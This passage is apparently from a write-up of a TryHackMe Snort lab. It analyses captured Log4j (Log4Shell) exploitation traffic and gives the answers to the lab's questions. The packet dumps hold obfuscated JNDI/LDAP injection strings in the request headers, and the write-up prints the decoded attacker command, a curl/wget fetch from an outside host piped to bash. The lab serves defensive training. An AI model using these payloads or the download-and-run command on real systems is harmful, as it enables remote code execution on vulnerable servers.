0x00E0: 49 7A 4D 7A 6F 31 4F 44 63 30 4C 7A 45 32 4D 69  IzMzo1ODc0LzE2Mi
0x00F0: 34 77 4C 6A 49 79 4F 43 34 79 4E 54 4D 36 4F 44  4wLjIyOC4yNTM6OD
0x0100: 41 70 66 47 4A 68 63 32 67 3D 7D 20 48 54 54 50  ApfGJhc2g=} HTTP
0x0110: 2F 31 2E 31 0D 0A 48 6F 73 74 3A 20 31 39 38 2E  /1.1..Host: 198.
0x0120: 37 31 2E 32 34 37 2E 39 31 3A 38 30 0D 0A 55 73  71.247.91:80..Us
0x0130: 65 72 2D 41 67 65 6E 74 3A 20 24 7B 24 7B 3A 3A  er-Agent: ${${::
0x0140: 2D 6A 7D 24 7B 3A 3A 2D 6E 7D 24 7B 3A 3A 2D 64  -j}${::-n}${::-d
0x0150: 7D 24 7B 3A 3A 2D 69 7D 3A 24 7B 3A 3A 2D 6C 7D  }${::-i}:${::-l}
0x0160: 24 7B 3A 3A 2D 64 7D 24 7B 3A 3A 2D 61 7D 24 7B  ${::-d}${::-a}${
0x0170: 3A 3A 2D 70 7D 3A 2F 2F 34 35 2E 31 35 35 2E 32  ::-p}://45.155.2
0x0180: 30 35 2E 32 33 33 3A 31 32 33 34 34 2F 42 61 73  05.233:12344/Bas
0x0190: 69 63 2F 43 6F 6D 6D 61 6E 64 2F 42 61 73 65 36  ic/Command/Base6
0x01A0: 34 2F 4B 47 4E 31 63 6D 77 67 4C 58 4D 67 4E 44  4/KGN1cmwgLXMgND
0x01B0: 55 75 4D 54 55 31 4C 6A 49 77 4E 53 34 79 4D 7A  UuMTU1LjIwNS4yMz
0x01C0: 4D 36 4E 54 67 33 4E 43 38 78 4E 6A 49 75 4D 43  M6NTg3NC8xNjIuMC
0x01D0: 34 79 4D 6A 67 75 4D 6A 55 7A 4F 6A 67 77 66 48  4yMjguMjUzOjgwfH
0x01E0: 78 33 5A 32 56 30 49 43 31 78 49 43 31 50 4C 53  x3Z2V0IC1xIC1PLS
0x01F0: 41 30 4E 53 34 78 4E 54 55 75 4D 6A 41 31 4C 6A  A0NS4xNTUuMjA1Lj
0x0200: 49 7A 4D 7A 6F 31 4F 44 63 30 4C 7A 45 32 4D 69  IzMzo1ODc0LzE2Mi
0x0210: 34 77 4C 6A 49 79 4F 43 34 79 4E 54 4D 36 4F 44  4wLjIyOC4yNTM6OD
0x0220: 41 70 66 47 4A 68 63 32 67 3D 7D 0D 0A 52 65 66  ApfGJhc2g=}..Ref
0x0230: 65 72 65 72 3A 20 24 7B 6A 6E 64 69 3A 24 7B 6C  erer: ${jndi:${l
0x0240: 6F 77 65 72 3A 6C 7D 24 7B 6C 6F 77 65 72 3A 64  ower:l}${lower:d
0x0250: 7D 24 7B 6C 6F 77 65 72 3A 61 7D 24 7B 6C 6F 77  }${lower:a}${low
0x0260: 65 72 3A 70 7D 3A 2F 2F 34 35 2E 31 35 35 2E 32  er:p}://45.155.2
0x0270: 30 35 2E 32 33 33 3A 31 32 33 34 34 2F 42 61 73  05.233:12344/Bas
0x0280: 69 63 2F 43 6F 6D 6D 61 6E 64 2F 42 61 73 65 36  ic/Command/Base6
0x0290: 34 2F 4B 47 4E 31 63 6D 77 67 4C 58 4D 67 4E 44  4/KGN1cmwgLXMgND
0x02A0: 55 75 4D 54 55 31 4C 6A 49 77 4E 53 34 79 4D 7A  UuMTU1LjIwNS4yMz
0x02B0: 4D 36 4E 54 67 33 4E 43 38 78 4E 6A 49 75 4D 43  M6NTg3NC8xNjIuMC
0x02C0: 34 79 4D 6A 67 75 4D 6A 55 7A 4F 6A 67 77 66 48  4yMjguMjUzOjgwfH
0x02D0: 78 33 5A 32 56 30 49 43 31 78 49 43 31 50 4C 53  x3Z2V0IC1xIC1PLS
0x02E0: 41 30 4E 53 34 78 4E 54 55 75 4D 6A 41 31 4C 6A  A0NS4xNTUuMjA1Lj
0x02F0: 49 7A 4D 7A 6F 31 4F 44 63 30 4C 7A 45 32 4D 69  IzMzo1ODc0LzE2Mi
0x0300: 34 77 4C 6A 49 79 4F 43 34 79 4E 54 4D 36 4F 44  4wLjIyOC4yNTM6OD
0x0310: 41 70 66 47 4A 68 63 32 67 3D 7D 0D 0A 41 63 63  ApfGJhc2g=}..Acc
0x0320: 65 70 74 2D 45 6E 63 6F 64 69 6E 67 3A 20 67 7A  ept-Encoding: gz
0x0330: 69 70 0D 0A 43 6F 6E 6E 65 63 74 69 6F 6E 3A 20  ip..Connection: 
0x0340: 63 6C 6F 73 65 0D 0A 0D 0A                       close....

=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+
<---snip--->
```

Answer: Base64

#### Investigate the log/alarm files. What is the IP ID of the corresponding packet?

```bash
ubuntu@ip-10-10-135-195:~/Desktop/Exercise-Files/TASK-8 (Log4j)$ sudo snort -X -r snort.log.1746794726 
Running in packet dump mode

        --== Initializing Snort ==--
Initializing Output Plugins!
pcap DAQ configured to read-file.
Acquiring network traffic from "snort.log.1746794726".
<---snip--->
=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+

WARNING: No preprocessors configured for policy 0.
12/12-05:06:07.579734 45.155.205.233:39692 -> 198.71.247.91:80
TCP TTL:53 TOS:0x0 ID:62808 IpLen:20 DgmLen:827
***AP*** Seq: 0xDC9A621B  Ack: 0x9B92AFC8  Win: 0x1F6  TcpLen: 32
TCP Options (3) => NOP NOP TS: 1584792788 1670627000 
0x0000: 00 16 3C F1 FD 6D 64 9E F3 BE DB 66 08 00 45 00  ..<..md....f..E.
0x0010: 03 3B F5 58 00 00 35 06 D4 3C 2D 9B CD E9 C6 47  .;.X..5..<-....G
0x0020: F7 5B 9B 0C 00 50 DC 9A 62 1B 9B 92 AF C8 80 18  .[...P..b.......
0x0030: 01 F6 1F 4F 00 00 01 01 08 0A 5E 76 04 D4 63 93  ...O......^v..c.
0x0040: BE B8 47 45 54 20 2F 3F 78 3D 24 7B 6A 6E 64 69  ..GET /?x=${jndi
0x0050: 3A 6C 64 61 70 3A 2F 2F 34 35 2E 31 35 35 2E 32  :ldap://45.155.2
0x0060: 30 35 2E 32 33 33 3A 31 32 33 34 34 2F 42 61 73  05.233:12344/Bas
0x0070: 69 63 2F 43 6F 6D 6D 61 6E 64 2F 42 61 73 65 36  ic/Command/Base6
0x0080: 34 2F 4B 47 4E 31 63 6D 77 67 4C 58 4D 67 4E 44  4/KGN1cmwgLXMgND
0x0090: 55 75 4D 54 55 31 4C 6A 49 77 4E 53 34 79 4D 7A  UuMTU1LjIwNS4yMz
0x00A0: 4D 36 4E 54 67 33 4E 43 38 78 4E 6A 49 75 4D 43  M6NTg3NC8xNjIuMC
0x00B0: 34 79 4D 6A 67 75 4D 6A 55 7A 4F 6A 67 77 66 48  4yMjguMjUzOjgwfH
0x00C0: 78 33 5A 32 56 30 49 43 31 78 49 43 31 50 4C 53  x3Z2V0IC1xIC1PLS
0x00D0: 41 30 4E 53 34 78 4E 54 55 75 4D 6A 41 31 4C 6A  A0NS4xNTUuMjA1Lj
0x00E0: 49 7A 4D 7A 6F 31 4F 44 63 30 4C 7A 45 32 4D 69  IzMzo1ODc0LzE2Mi
0x00F0: 34 77 4C 6A 49 79 4F 43 34 79 4E 54 4D 36 4F 44  4wLjIyOC4yNTM6OD
0x0100: 41 70 66 47 4A 68 63 32 67 3D 7D 20 48 54 54 50  ApfGJhc2g=} HTTP
<---snip--->
```

Answer: 62808

#### Investigate the log/alarm files. Decode the encoded command. What is the attacker's command?

Hint: You can use the "base64" tool. Read the log/alarm files and extract the bas64 command. base64 --decode filename.txt

See previous question for the raw data. Decode with `base64 -d`:

```bash
ubuntu@ip-10-10-135-195:~/Desktop/Exercise-Files/TASK-8 (Log4j)$ echo 'KGN1cmwgLXMgNDUuMTU1LjIwNS4yMzM6NTg3NC8xNjIuMC4yMjguMjUzOjgwfHx3Z2V0IC1xIC1PLSA0NS4xNTUuMjA1LjIzMzo1ODc0LzE2Mi4wLjIyOC4yNTM6ODApfGJhc2g=' | base64 -d
(curl -s 45.155.205.233:5874/162.0.228.253:80||wget -q -O- 45.155.205.233:5874/162.0.228.253:80)|
bashubuntu@ip-10-10-135-195:~/Desktop/Exercise-Files/TASK-8 (Log4j)$ 
```

Answer: `curl -s 45.155.205.233:5874/162.0.228.253:80||wget -q -O- 45.155.205.233:5874/162.0.228.253:80`

#### What is the CVSS v2 score of the Log4j vulnerability?

From `https://nvd.nist.gov/vuln/detail/CVE-2021-44228`

Answer: 9.3

### Task 9 - Conclusion

Congratulations! Are you brave enough to stop a live attack in the [Snort2 Challenge 2 room](https://tryhackme.com/room/snortchallenges2)?

For additional information, please see the references below.

## References

- [File Transfer Protocol - Wikipedia](https://en.wikipedia.org/wiki/File_Transfer_Protocol)
- [grep - Linux manual page](https://man7.org/linux/man-pages/man1/grep.1.html)
- [List of file signatures - Wikipedia](https://en.wikipedia.org/wiki/List_of_file_signatures)
- [List of FTP server return codes - Wikipedia](https://en.wikipedia.org/wiki/List_of_FTP_server_return_codes)
- [Snort - Documents](https://www.snort.org/documents)
- [Snort - Homepage](https://www.snort.org/)
- [snort - Linux manual page](https://manpages.org/snort/8)
- [Snort 3 Rule Writing Guide - Rule Options](https://docs.snort.org/rules/options/)
- [tcpdump - Linux manual page](https://man7.org/linux/man-pages/man1/tcpdump.1.html)
- [Torrent file - Wikipedia](https://en.wikipedia.org/wiki/Torrent_file)
- [wc - Linux manual page](https://man7.org/linux/man-pages/man1/wc.1.html)
